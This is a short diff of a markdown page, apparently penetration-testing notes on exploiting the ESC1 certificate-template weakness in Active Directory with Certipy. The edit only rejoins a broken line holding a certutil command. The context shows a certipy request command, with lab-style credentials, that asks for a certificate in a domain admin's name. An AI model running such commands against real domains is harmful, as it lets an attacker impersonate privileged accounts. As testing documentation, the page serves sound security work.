@@ -75,8 +75,7 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 ### Exploiting ESC1
 
-To find the exact Certificate Authority (CA) use `
-certutil –config – -ping` in CMD (<https://www.cloudservus.com/blog/how-to-find-a-certificate-authority-in-your-active-directory-environment>).
+To find the exact Certificate Authority (CA) use `certutil –config – -ping` in CMD (<https://www.cloudservus.com/blog/how-to-find-a-certificate-authority-in-your-active-directory-environment>).
 
 ```plain
 $ certipy req -u 'crypt0rr.offsec.nl' -p 'Welkom1234' -target 'dc01.offsec.nl' -ca 'CA01-OFFSEC' -template 'ESC1' -upn 'john-da@offsec.nl'
